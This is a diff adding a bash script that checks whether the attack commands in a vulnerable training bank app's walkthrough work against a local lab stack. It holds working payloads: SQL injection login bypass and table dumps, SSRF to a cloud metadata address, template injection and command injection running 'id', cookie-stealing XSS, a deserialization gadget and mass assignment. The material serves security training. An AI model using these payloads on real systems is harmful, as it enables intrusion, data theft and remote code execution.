@@ -1,0 +1,215 @@
+#!/usr/bin/env bash
+#
+# Validates that the commands shown in WALKTHROUGH.md actually work against the
+# running stack. Run this after editing the walkthrough.
+#
+set -uo pipefail
+
+API="${API:-http://localhost:8080}"
+REPORT="${REPORT:-http://localhost:8081}"
+
+PASS=0
+FAIL=0
+
+login() {
+  curl -s -X POST "$API/api/auth/login" -H "Content-Type: application/json" \
+    -d "{\"username\":\"$1\",\"password\":\"$2\"}" \
+    | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null
+}
+
+check() {
+  local desc="$1" actual="$2" expected="$3"
+  if [[ "$actual" == *"$expected"* ]]; then
+    printf '\033[32m  PASS\033[0m %s\n' "$desc"
+    PASS=$((PASS + 1))
+  else
+    printf '\033[31m  FAIL\033[0m %s\n' "$desc"
+    echo "        expected to contain: $expected"
+    echo "        got: ${actual:0:250}"
+    FAIL=$((FAIL + 1))
+  fi
+}
+
+TOKEN="$(login alice password123)"
+if [[ -z "$TOKEN" ]]; then
+  echo "could not log in as alice"
+  exit 1
+fi
+AUTH=(-H "Authorization: Bearer $TOKEN")
+
+echo "== Lab 1: IDOR =="
+check "GET /api/a01/accounts/2 returns bob's account" \
+  "$(curl -s "${AUTH[@]}" "$API/api/a01/accounts/2")" '"account_number":"ACC-1002"'
+
+echo "== Lab 2: privilege escalation =="
+check "GET /api/a01/admin/users as a customer" \
+  "$(curl -s "${AUTH[@]}" "$API/api/a01/admin/users")" '"username":"admin"'
+
+echo "== Lab 3: SSRF =="
+check "SSRF to the internal report service" \
+  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
+     -d '{"account_id":1,"callback_url":"http://report:8081/api/report/report/generate"}' \
+     "$API/api/a01/accounts/statement-email")" '"status"'
+check "SSRF to the metadata address reports sent_to" \
+  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
+     -d '{"account_id":1,"callback_url":"http://169.254.169.254/latest/meta-data/"}' \
+     "$API/api/a01/accounts/statement-email")" '"sent_to"'
+
+echo "== Lab 4: debug =="
+check "GET /api/a02/debug leaks jwt.secret" \
+  "$(curl -s "$API/api/a02/debug")" '"jwt.secret":"secret"'
+check "GET /api/a02/debug/boom returns a stack trace" \
+  "$(curl -s "$API/api/a02/debug/boom")" 'Exception'
+
+echo "== Lab 5: default admin =="
+check "admin/admin logs into the admin console" \
+  "$(login admin admin)" 'eyJ'
+
+echo "== Lab 6: file exposure =="
+check "/.env is served" "$(curl -s "$API/.env")" 'JWT_SECRET'
+check "/.git/config is served" "$(curl -s "$API/.git/config")" 'securebank-internet-banking.git'
+check "/backup.zip is served" \
+  "$(curl -s -o /dev/null -w '%{http_code}' "$API/backup.zip")" '200'
+
+echo "== Lab 7: MD5 =="
+check "GET /api/a04/hashes" \
+  "$(curl -s "${AUTH[@]}" "$API/api/a04/hashes")" '482c811da5d5b4bc6d497ffa98491e38'
+check "GET /api/a04/crack" \
+  "$(curl -s "${AUTH[@]}" "$API/api/a04/crack")" 'password123'
+
+echo "== Lab 9: PII =="
+check "GET /api/a04/profile leaks the account number" \
+  "$(curl -s "${AUTH[@]}" "$API/api/a04/profile")" '"account_number":"ACC-1001"'
+
+echo "== Lab 10: SQL injection =="
+check "login bypass with admin' --" \
+  "$(curl -s -X POST -H "Content-Type: application/json" \
+     -d '{"username":"admin'\'' --","password":"anything"}' \
+     "$API/api/a05/auth/login")" '"token"'
+check "UNION SELECT dumps the users table" \
+  "$(curl -s "${AUTH[@]}" "$API/api/a05/transfers/search?q='+UNION+SELECT+username,password_hash,email,role,id+FROM+users--")" '"count":4'
+check "GET /api/a05/schema lists the tables" \
+  "$(curl -s "${AUTH[@]}" "$API/api/a05/schema")" '"users"'
+
+echo "== Lab 11: SSTI =="
+check "7*7 evaluates to 49" \
+  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
+     -d '{"remark":"7*7"}' "$API/api/a05/transfers/1/remark")" '49'
+check "Runtime.exec is reachable" \
+  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
+     -d '{"remark":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{\"id\"})"}' \
+     "$API/api/a05/transfers/1/remark")" 'uid='
+
+echo "== Lab 12: report service =="
+check "SSTI reads config.secretKey" \
+  "$(curl -s -X POST -H "Content-Type: application/json" \
+     --data-binary '{"account_id":"1001","template":"Secret: ${config.secretKey}"}' \
+     "$REPORT/api/report/report/generate")" 'sb-report-internal-secret'
+check "SSTI reads config.dbPath" \
+  "$(curl -s -X POST -H "Content-Type: application/json" \
+     --data-binary '{"account_id":"1001","template":"DB: ${config.dbPath}"}' \
+     "$REPORT/api/report/report/generate")" '/var/lib/securebank'
+check "date-filter echoes the command it runs" \
+  "$(curl -s -X POST -H "Content-Type: application/json" \
+     -d '{"from_date":"2024-01-01","to_date":"2024-12-31"}' \
+     "$REPORT/api/report/report/date-filter")" 'echo'
+check "command injection runs id" \
+  "$(curl -s -X POST -H "Content-Type: application/json" \
+     -d '{"from_date":"2024-01-01'"'"' && id && echo '"'"'","to_date":"2024-12-31"}' \
+     "$REPORT/api/report/report/date-filter")" 'uid='
+
+echo "== Lab 13: stored XSS =="
+check "the note is stored verbatim" \
+  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
+     -d '{"from_account_id":1,"to_account_id":2,"amount":1,"note":"<img src=x onerror=alert(document.cookie)>"}' \
+     "$API/api/a05/transfers/send")" 'onerror=alert'
+check "the note is returned to every client" \
+  "$(curl -s "${AUTH[@]}" "$API/api/a05/transfers")" 'onerror=alert'
+
+echo "== Lab 14: negative transfer =="
+check "a negative transfer is accepted" \
+  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
+     -d '{"from_account_id":2,"to_account_id":1,"amount":-1000}' \
+     "$API/api/a06/transfers/")" '"transfer_id"'
+
+echo "== Lab 15: mass assignment =="
+check "the role is bound from the request body" \
+  "$(curl -s -X PATCH "${AUTH[@]}" -H "Content-Type: application/json" \
+     -d '{"username":"alice","email":"alice@bank.com","role":"admin"}' \
+     "$API/api/a06/profile")" '"role":"admin"'
+curl -s -X PATCH "${AUTH[@]}" -H "Content-Type: application/json" \
+  -d '{"username":"alice","email":"alice@bank.com","role":"customer"}' \
+  "$API/api/a06/profile" >/dev/null
+
+echo "== Lab 16: enumeration =="
+check "missing user" \
+  "$(curl -s -X POST -H "Content-Type: application/json" \
+     -d '{"username":"notauser","password":"x"}' "$API/api/a06/auth/login/")" 'User not found'
+check "existing user" \
+  "$(curl -s -X POST -H "Content-Type: application/json" \
+     -d '{"username":"alice","password":"wrongpassword"}' "$API/api/a06/auth/login/")" 'Incorrect password'
+
+echo "== Lab 17: brute force =="
+check "attempts are counted" \
+  "$(curl -s "${AUTH[@]}" "$API/api/a07/auth/attempts")" 'attempts'
+
+echo "== Lab 18: session fixation =="
+JAR="$(mktemp)"
+SID="$(curl -s -c "$JAR" -X POST "$API/api/a07/session/init" \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['session_id'])" 2>/dev/null)"
+curl -s -c "$JAR" -b "$JAR" -X POST "$API/api/a07/auth/login-session" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"password123"}' >/dev/null
+check "the pre-login session id is now authenticated" \
+  "$(curl -s -b "$JAR" "$API/api/a07/session/whoami")" '"username":"alice"'
+check "the session id was not regenerated" \
+  "$(curl -s -b "$JAR" "$API/api/a07/session/whoami")" "$SID"
+rm -f "$JAR"
+
+echo "== Lab 19: predictable reset token =="
+check "a reset token is issued" \
+  "$(curl -s -X POST -H "Content-Type: application/json" \
+     -d '{"username":"alice"}' "$API/api/a07/auth/reset-request")" '"token"'
+
+echo "== Lab 20: deserialization =="
+PAYLOAD="$(mktemp)"
+cat > "$PAYLOAD" <<'JSON'
+{"@class":"com.securebank.lab.a08.gadget.AccountImportJob","command":"id"}
+JSON
+check "the gadget executes the command" \
+  "$(curl -s -X POST "${AUTH[@]}" -F "data=@$PAYLOAD" \
+     "$API/api/a08/integrity/import-account")" 'uid='
+rm -f "$PAYLOAD"
+check "default typing is enabled" \
+  "$(curl -s -X POST "${AUTH[@]}" "$API/api/a08/integrity/import-account/describe")" 'enabled'
+
+echo "== Lab 22: file upload =="
+TMP="$(mktemp)"
+echo "SHELL_HERE" > "$TMP"
+check "the upload is accepted" \
+  "$(curl -s -X POST "${AUTH[@]}" -F "file=@$TMP" "$API/api/a08/kyc-upload")" '"uploaded":true'
+check "the uploaded file is served back" \
+  "$(curl -s "$API/uploads/$(basename "$TMP")")" 'SHELL_HERE'
+rm -f "$TMP"
+
+echo "== Lab 23: verbose error =="
+check "a stack trace is returned" \
+  "$(curl -s "$API/api/a10/transfers/account-summary?id=abc")" 'NumberFormatException'
+check "the trace names the endpoint" \
+  "$(curl -s "$API/api/a10/transfers/account-summary?id=abc")" 'account-summary'
+
+echo "== Lab 24: type coercion =="
+check "the amount parameter is named" \
+  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
+     -d '{"from_account_id":1,"to_account_id":2,"amount":"notanumber"}' \
+     "$API/api/a10/transfers/send")" 'amount'
+
+echo "== Lab 25: auth bypass =="
+check "a garbage token is accepted" \
+  "$(curl -s -o /dev/null -w '%{http_code}' \
+     -H "Authorization: Bearer THISISNOTAVALIDTOKEN" \
+     "$API/api/a10/transfers/history")" '200'
+
+echo
+echo "passed: $PASS   failed: $FAIL"
+[[ "$FAIL" -eq 0 ]] || exit 1
